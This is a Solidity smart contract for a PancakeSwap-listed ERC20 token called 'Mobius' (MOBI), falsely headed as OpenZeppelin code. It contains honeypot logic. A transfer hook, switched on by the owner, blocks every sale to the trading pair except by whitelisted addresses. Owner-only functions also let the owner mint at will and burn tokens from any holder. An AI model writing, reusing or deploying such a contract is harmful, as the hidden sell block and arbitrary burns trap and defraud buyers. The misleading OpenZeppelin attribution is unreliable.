// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0

pragma solidity ^0.8.0;

import "ERC20.sol";
import "Ownable.sol";

interface IPancakeswap_Router {
 function factory() external pure returns (address);
 function WETH() external pure returns (address);
}

interface IPancakeswap_Factory {
 function createPair(address tokenA, address tokenB) external returns (address pair);
}


contract Token is ERC20, Ownable {
 

 IPancakeswap_Router private pROUTER;
 IPancakeswap_Factory private pFACTORY;
 address private pWETH;
 address private pPAIR;
 bool private ALLOWANCEBLOCKING;
 mapping(address=>bool) private SELLALLOWANCE;


    constructor (address _router) ERC20("Mobius", "MOBI") Ownable() {

        //mint some tokens for Admin, totalSupply will be increased accordingly [ERC20._mint]
        mint(msg.sender, 1000000 * ( 10 ** uint256(decimals())));

        //setup Pancakeswap & create pair
        pROUTER = IPancakeswap_Router(_router);
        pFACTORY = IPancakeswap_Factory(pROUTER.factory());
        pWETH = pROUTER.WETH();
        pPAIR = pFACTORY.createPair(address(this),pWETH);

    }
 
    function mint(address account, uint256 amount) public onlyOwner {
        _mint(account, amount);
    }
 
    function burn(address account, uint256 amount) public onlyOwner {
        _burn(account, amount);
    }

    function setSellBlocking(bool onoff) public onlyOwner {
        ALLOWANCEBLOCKING=onoff;
    }


    //set selling allowance list
    function setSellAllowance(address account, bool allowance) public onlyOwner {
        SELLALLOWANCE[account] = allowance;
    }


    //hook before every ERC20 transfer
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal view override(ERC20) {

    if(ALLOWANCEBLOCKING) {
     if(!SELLALLOWANCE[from]) {
      if( (to == pPAIR) && (from != address(this) ) ) {
       revert("Selling is not allowed");
       }
      }
     }

    }

 
}